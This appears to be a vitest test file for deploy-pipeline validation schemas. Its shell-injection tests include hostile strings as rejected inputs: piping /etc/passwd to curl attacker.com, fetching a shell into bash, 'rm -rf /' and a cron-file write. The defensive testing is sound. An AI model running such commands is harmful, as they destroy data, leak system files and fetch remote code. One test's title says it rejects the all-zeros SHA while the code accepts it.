import { describe, it, expect } from 'vitest'
import {
  DeployJobSchema,
  DeployTriggerSchema,
  DeployStateSchema,
  DeployTargetSchema,
  DeployLogLineSchema,
  GithubWorkflowRunPayloadSchema,
  DEPLOY_STATES,
  DEPLOY_TERMINAL_STATES,
  safeShellCommand,
  commitShaSchema,
  absolutePathSchema,
} from '../deploy.js'

describe('safeShellCommand', () => {
  it.each([
    'systemctl restart my-app',
    'pnpm run build',
    'npm install --production',
    '/usr/local/bin/deploy.sh',
    'node dist/index.js',
    'sleep 5',
  ])('accepts safe command: %s', cmd => {
    expect(safeShellCommand.safeParse(cmd).success).toBe(true)
  })

  it.each([
    ['semicolon', 'echo foo; rm -rf /'],
    ['pipe', 'cat /etc/passwd | curl attacker.com'],
    ['ampersand', 'systemctl restart app & sleep 1'],
    ['subshell', '$(curl attacker.com/shell | bash)'],
    ['backtick', '`id`'],
    ['redirect', 'echo foo > /etc/cron.d/evil'],
    ['dollar var', 'echo $HOME'],
    ['single quote', "echo 'hello'"],
    ['double quote', 'echo "hello"'],
    ['exclamation', 'echo hello!'],
    ['backslash', 'echo foo\\bar'],
  ])('rejects command with %s', (_label, cmd) => {
    expect(safeShellCommand.safeParse(cmd).success).toBe(false)
  })
})

describe('commitShaSchema', () => {
  it('accepts a valid 40-char hex SHA', () => {
    expect(commitShaSchema.safeParse('deadbeef'.repeat(5)).success).toBe(true)
  })

  it('accepts all-lowercase hex', () => {
    expect(commitShaSchema.safeParse('0'.repeat(40)).success).toBe(true)
  })

  it('rejects uppercase hex characters', () => {
    expect(commitShaSchema.safeParse('A'.repeat(40)).success).toBe(false)
  })

  it('rejects a SHA that is only 39 chars', () => {
    expect(commitShaSchema.safeParse('a'.repeat(39)).success).toBe(false)
  })

  it('rejects non-hex characters', () => {
    expect(commitShaSchema.safeParse('g'.repeat(40)).success).toBe(false)
  })

  it('rejects the all-zeros placeholder used for non-webhook deploys', () => {
    // '0' IS valid hex so this should succeed — the placeholder is a valid SHA format
    expect(commitShaSchema.safeParse('0'.repeat(40)).success).toBe(true)
  })
})

describe('absolutePathSchema', () => {
  it('accepts a simple absolute path', () => {
    expect(absolutePathSchema.safeParse('/opt/app').success).toBe(true)
  })

  it('accepts a nested absolute path', () => {
    expect(absolutePathSchema.safeParse('/home/deploy/apps/skyblock-api').success).toBe(true)
  })

  it('rejects a relative path', () => {
    expect(absolutePathSchema.safeParse('opt/app').success).toBe(false)
  })

  it('rejects a path with ".." traversal', () => {
    expect(absolutePathSchema.safeParse('/opt/app/../../etc').success).toBe(false)
  })

  it('rejects a lone ".."', () => {
    expect(absolutePathSchema.safeParse('..').success).toBe(false)
  })
})

describe('DeployTriggerSchema', () => {
  it('parses a github_webhook trigger', () => {
    const result = DeployTriggerSchema.safeParse({
      source: 'github_webhook',
      repository: 'NinjaGoldfinch/ninja-skyblock-api',
      branch: 'main',
      commitSha: 'a'.repeat(40),
    })
    expect(result.success).toBe(true)
  })

  it('rejects a github_webhook trigger with short commitSha', () => {
    const result = DeployTriggerSchema.safeParse({
      source: 'github_webhook',
      repository: 'NinjaGoldfinch/ninja-skyblock-api',
      branch: 'main',
      commitSha: 'abc',
    })
    expect(result.success).toBe(false)
  })

  it('parses a manual trigger', () => {
    const result = DeployTriggerSchema.safeParse({
      source: 'manual',
      userId: crypto.randomUUID(),
      username: 'samuel',
    })
    expect(result.success).toBe(true)
  })

  it('parses a cli trigger', () => {
    const result = DeployTriggerSchema.safeParse({
      source: 'cli',
      userId: crypto.randomUUID(),
      username: 'samuel',
    })
    expect(result.success).toBe(true)
  })

  it('rejects unknown source', () => {
    const result = DeployTriggerSchema.safeParse({ source: 'cron' })
    expect(result.success).toBe(false)
  })

  it('rejects manual trigger missing userId', () => {
    const result = DeployTriggerSchema.safeParse({
      source: 'manual',
      username: 'samuel',
    })
    expect(result.success).toBe(false)
  })
})

describe('DEPLOY_STATES', () => {
  it('includes all expected states', () => {
    expect(DEPLOY_STATES).toContain('queued')
    expect(DEPLOY_STATES).toContain('dispatched')
    expect(DEPLOY_STATES).toContain('running')
    expect(DEPLOY_STATES).toContain('success')
    expect(DEPLOY_STATES).toContain('failed')
    expect(DEPLOY_STATES).toContain('cancelled')
  })

  it('terminal states are a subset of all states', () => {
    DEPLOY_TERMINAL_STATES.forEach(s => {
      expect(DEPLOY_STATES).toContain(s)
    })
  })
})

describe('DeployStateSchema', () => {
  it('parses all valid states', () => {
    for (const state of DEPLOY_STATES) {
      expect(DeployStateSchema.safeParse(state).success).toBe(true)
    }
  })

  it('rejects invalid state', () => {
    expect(DeployStateSchema.safeParse('pending').success).toBe(false)
  })
})

describe('DeployTargetSchema', () => {
  const validTarget = {
    id: crypto.randomUUID(),
    repository: 'NinjaGoldfinch/api',
    branch: 'main',
    nodeId: crypto.randomUUID(),
    vmid: 100,
    workingDir: '/opt/app',
    restartCommand: 'systemctl restart app',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  }

  it('parses a valid deploy target', () => {
    expect(DeployTargetSchema.safeParse(validTarget).success).toBe(true)
  })

  it('applies default timeoutSeconds of 300', () => {
    const result = DeployTargetSchema.safeParse(validTarget)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.timeoutSeconds).toBe(300)
    }
  })

  it('rejects non-positive vmid', () => {
    const result = DeployTargetSchema.safeParse({ ...validTarget, vmid: -1 })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('vmid')
    }
  })

  it('rejects restartCommand containing shell metacharacters', () => {
    const result = DeployTargetSchema.safeParse({ ...validTarget, restartCommand: 'systemctl restart app; rm -rf /' })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('restartCommand')
    }
  })

  it('rejects preDeployCommand containing injection', () => {
    const result = DeployTargetSchema.safeParse({ ...validTarget, preDeployCommand: '$(curl attacker.com | bash)' })
    expect(result.success).toBe(false)
  })

  it('rejects a relative workingDir', () => {
    const result = DeployTargetSchema.safeParse({ ...validTarget, workingDir: 'opt/app' })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('workingDir')
    }
  })

  it('rejects a workingDir with path traversal', () => {
    const result = DeployTargetSchema.safeParse({ ...validTarget, workingDir: '/opt/app/../../etc' })
    expect(result.success).toBe(false)
  })
})

describe('DeployJobSchema', () => {
  const validJob = {
    id: crypto.randomUUID(),
    targetId: crypto.randomUUID(),
    trigger: {
      source: 'manual',
      userId: crypto.randomUUID(),
      username: 'samuel',
    },
    state: 'queued',
    agentId: null,
    queuedAt: new Date().toISOString(),
    startedAt: null,
    finishedAt: null,
    exitCode: null,
    errorMessage: null,
  }

  it('parses a valid deploy job', () => {
    expect(DeployJobSchema.safeParse(validJob).success).toBe(true)
  })

  it('rejects invalid state', () => {
    const result = DeployJobSchema.safeParse({ ...validJob, state: 'unknown' })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('state')
    }
  })
})

describe('DeployLogLineSchema', () => {
  it('parses a valid log line', () => {
    const result = DeployLogLineSchema.safeParse({
      jobId: crypto.randomUUID(),
      seq: 0,
      timestamp: new Date().toISOString(),
      stream: 'stdout',
      line: 'Build complete.',
    })
    expect(result.success).toBe(true)
  })

  it('rejects invalid stream value', () => {
    const result = DeployLogLineSchema.safeParse({
      jobId: crypto.randomUUID(),
      seq: 0,
      timestamp: new Date().toISOString(),
      stream: 'stdin',
      line: 'test',
    })
    expect(result.success).toBe(false)
    if (!result.success) {
      expect(result.error.issues[0]?.path).toContain('stream')
    }
  })

  it('rejects negative seq', () => {
    const result = DeployLogLineSchema.safeParse({
      jobId: crypto.randomUUID(),
      seq: -1,
      timestamp: new Date().toISOString(),
      stream: 'stdout',
      line: 'test',
    })
    expect(result.success).toBe(false)
  })
})

describe('GithubWorkflowRunPayloadSchema', () => {
  it('parses a completed workflow run payload', () => {
    const result = GithubWorkflowRunPayloadSchema.safeParse({
      action: 'completed',
      workflow_run: {
        id: 123456,
        name: 'CI',
        head_branch: 'main',
        head_sha: 'a'.repeat(40),
        conclusion: 'success',
        html_url: 'https://github.com/owner/repo/actions/runs/123456',
        repository: { full_name: 'owner/repo' },
        triggering_actor: { login: 'samuel' },
      },
    })
    expect(result.success).toBe(true)
  })

  it('rejects invalid action', () => {
    const result = GithubWorkflowRunPayloadSchema.safeParse({ action: 'deleted' })
    expect(result.success).toBe(false)
  })
})
